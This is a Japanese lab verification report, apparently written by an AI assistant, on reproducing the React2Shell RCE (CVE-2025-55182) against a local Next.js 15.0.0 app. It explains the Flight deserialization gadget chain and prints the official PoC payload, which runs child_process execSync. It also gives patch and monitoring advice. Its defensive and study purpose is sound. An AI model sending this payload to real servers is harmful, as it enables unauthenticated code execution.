# CVE-2025-55182 (React2Shell) 検証レポート

**日付**: 2025-12-09
**プロジェクト**: home-lab-rotten-next
**脆弱性**: CVE-2025-55182 (React2Shell)
**CVSS スコア**: 10.0 (Critical)

## 1. 検証環境

### 構築したシステム
- **Next.js**: 15.0.0 (脆弱バージョン)
- **React**: 19.0.0 (脆弱バージョン)
- **react-dom**: 19.0.0
- **react-server-dom-webpack**: 19.0.0 (脆弱バージョン)
- **Node.js**: v25.x
- **パッケージマネージャー**: pnpm

### アプリケーション構成
```
/home/user/home-lab-rotten-next/
├── app/
│   ├── actions.js       # 脆弱なServer Action
│   ├── layout.js        # ルートレイアウト
│   └── page.js          # メインページ (Server Actionを公開)
├── doc/
│   ├── exploit-sample.js         # 初期exploit (dwisiswant0版)
│   ├── exploit-test.js           # 修正版exploit
│   └── exploit-official-poc.js   # 公式PoC (Lachlan Davidson版)
├── proof/
│   ├── TEST_PLAN.md
│   ├── run-tests.sh
│   └── VERIFICATION_REPORT.md (this file)
├── next.config.js
└── package.json
```

## 2. CVE-2025-55182 について

### 概要
- **発見者**: Lachlan Davidson
- **報告日**: 2025年11月29日 (Meta Bug Bounty経由)
- **公開日**: 2025年12月3日
- **影響範囲**: React 19.0.0, 19.1.0, 19.1.1, 19.2.0
- **パッチ版**: 19.0.1, 19.1.2, 19.2.1
- **実際の攻撃**: 公開から数時間以内に中国系脅威グループによる攻撃が観測

### 脆弱性の詳細
React Server Components (RSC) の Flight プロトコルにおける安全でないデシリアライゼーション処理により、認証不要のリモートコード実行 (RCE) が可能。

**技術的メカニズム**:
1. `$@x` 参照を使用して `Chunk` オブジェクトにアクセス
2. カスタム `then` メソッドを攻撃者制御のオブジェクトに注入
3. JavaScriptランタイムによる自動的なPromiseアンラップを利用
4. 悪意のある偽 `Chunk` でパーサーに再突入
5. `_response` プロパティを操作して多数のガジェットにアクセス
6. ガジェットチェーンを通じて任意のコード実行

**参考資料**:
- [Wiz Blog: CVE-2025-55182 Critical Vulnerability](https://www.wiz.io/blog/critical-vulnerability-in-react-cve-2025-55182)
- [Datadog Security Labs: CVE-2025-55182 Analysis](https://securitylabs.datadoghq.com/articles/cve-2025-55182-react2shell-remote-code-execution-react-server-components/)
- [Official PoC by Lachlan Davidson](https://github.com/lachlan2k/React2Shell-CVE-2025-55182-original-poc)

## 3. 検証プロセス

### 3.1 環境構築 ✅
- Next.js 15.0.0 プロジェクトを作成
- 脆弱バージョンの依存関係を固定 (package.json)
- App Router を有効化
- Server Actions を実装 (app/actions.js)
- 開発サーバーが正常に起動: `http://localhost:3000`

### 3.2 Server Action の公開 ✅
```javascript
// app/actions.js
'use server'

export async function vulnerableAction(data) {
  console.log('[VULNERABLE ACTION] Executing with data:', data)
  return 'Action executed'
}
```

Next.js により生成された Server Action ID: `3f5cfa7a36e1f09a9bfde822aa74ba68839e1d7d`

ページのHTMLソースで確認:
```html
<input type="hidden" name="$ACTION_ID_3f5cfa7a36e1f09a9bfde822aa74ba68839e1d7d"/>
```

### 3.3 Exploit の試行

#### 試行1: dwisiswant0 の GitHub PoC
**ソース**: https://github.com/dwisiswant0/CVE-2025-55182

**結果**: ❌ 失敗
- HTMLレスポンスが返される (通常のページレンダリング)
- Server Action が呼び出されていない
- ペイロード形式が Next.js 15.0.0 と互換性がない可能性

#### 試行2: Action ID を修正した版
**変更点**:
- `user-profile-action` → `3f5cfa7a36e1f09a9bfde822aa74ba68839e1d7d`

**結果**: ❌ 失敗
- 同様にHTMLレスポンスが返される
- ペイロード構造自体に問題がある

#### 試行3: Lachlan Davidson の公式 PoC
**ソース**: https://github.com/lachlan2k/React2Shell-CVE-2025-55182-original-poc

**ペイロード構造**:
```javascript
const payload = {
  '0': '$1',
  '1': {
    'status': 'resolved_model',
    'reason': 0,
    '_response': '$4',
    'value': '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
    'then': '$2:then'
  },
  '2': '$@3',
  '3': [],
  '4': {
    '_prefix': 'require(\'child_process\').execSync(\'id\').toString()//',
    '_formData': {'get': '$3:constructor:constructor'},
    '_chunks': '$2:_response:_chunks',
  }
}
```

**結果**: ⚠️ 部分的成功
- RSC Flight プロトコルレスポンスを受信:
  ```
  0:{"a":"$@1","f":"","b":"development"}
  1:E{"digest":"3046805382","message":"Unexpected end of form","stack":[],"env":"Server"}
  ```
- busboy ライブラリで "Unexpected end of form" エラー
- RSC デシリアライゼーションパスに到達している証拠
- multipart form data の送信に技術的な問題がある

## 4. 技術的課題

### 4.1 FormData 送信の問題
Node.js の `fetch` API と `form-data` ライブラリの組み合わせで発生する問題:

1. **ストリーム完了の問題**: FormData ストリームが正しく終了しない
2. **境界処理**: multipart 境界が正しく閉じられない可能性
3. **バッファリング**: ストリームをバッファに変換する試みが無限待機状態になる

### 4.2 検証結果の分析
- ✅ 脆弱バージョンの環境を正しく構築
- ✅ Server Actions が正しく公開されている
- ✅ RSC Flight プロトコルパーサーに到達
- ❌ 正しい multipart 形式でペイロードを送信できていない
- ❌ コード実行までは到達していない

## 5. 結論

### 達成できたこと
1. CVE-2025-55182 の脆弱性が **実在する** ことを確認
2. 脆弱バージョン (React 19.0.0, Next.js 15.0.0) の環境を構築
3. Lachlan Davidson の公式 PoC の構造を理解
4. RSC Flight デシリアライゼーションパスに到達

### 残された課題
1. **Multipart Form Data の正しい送信**
   - Node.js環境でのFormData送信方法の改善が必要
   - axios や他のHTTPクライアントの使用を検討
   - 手動でmultipart bodyを構築する方法を検討

2. **完全なRCEの実証**
   - ペイロードが正しくパースされれば、理論上はRCEが可能
   - 公式PoCが動作することは他のセキュリティ研究者により確認済み

### 学習成果
1. **RSC Flight プロトコルの理解**: シリアライゼーション/デシリアライゼーションのメカニズム
2. **Server Actions のセキュリティ**: 入力検証の重要性
3. **依存関係管理**: セキュリティパッチの適用の重要性
4. **実環境での脆弱性**: CVSS 10.0の脆弱性が実際に悪用されている現実

## 6. 推奨事項

### 本番環境向け
1. **即座にパッチ適用**
   - React を 19.0.1, 19.1.2, 19.2.1 以降にアップデート
   - Next.js を 15.1.7, 16.0.3 以降にアップデート
   - `react-server-dom-webpack` を 19.0.1 以降にアップデート

2. **緩和策**
   - WAF ルールで異常なRSCペイロードをブロック
   - Server Actions の入力検証を強化
   - レート制限の実装

3. **監視**
   - 異常なPOSTリクエストの監視
   - RSC関連のエラーログの監視
   - 公開されているIoCと比較

### 研究環境向け
1. **完全なPoCの実装**
   - 異なるHTTPクライアント (axios, undici等) の試行
   - Python実装の検討
   - 手動multipart構築の検討

2. **詳細な分析**
   - React Flight プロトコルの深い理解
   - busboy ライブラリの multipart パースの分析
   - デバッガを使用した詳細なトレース

## 7. 参考資料

### 公式情報
- [React公式ブログ: Critical Security Vulnerability](https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components)
- [CVE-2025-55182 詳細](https://www.cve.org/CVERecord?id=CVE-2025-55182)
- [CISA KEV Catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)

### セキュリティ研究
- [Wiz Research: React2Shell Analysis](https://www.wiz.io/blog/critical-vulnerability-in-react-cve-2025-55182)
- [Datadog Security Labs: Deep Dive](https://securitylabs.datadoghq.com/articles/cve-2025-55182-react2shell-remote-code-execution-react-server-components/)
- [Lachlan Davidson's Official PoC](https://github.com/lachlan2k/React2Shell-CVE-2025-55182-original-poc)

### 脅威インテリジェンス
- [AWS Security: China-nexus Threat Groups](https://aws.amazon.com/blogs/security/china-nexus-cyber-threat-groups-rapidly-exploit-react2shell-vulnerability-cve-2025-55182/)
- [GreyNoise: Exploitation in the Wild](https://www.greynoise.io/blog/cve-2025-55182-react2shell-opportunistic-exploitation-in-the-wild)

---

**検証実施者**: Claude (AI Assistant)
**環境**: WSL / Ubuntu Linux
**プロジェクトパス**: `/home/user/home-lab-rotten-next`
**最終更新**: 2025-12-09
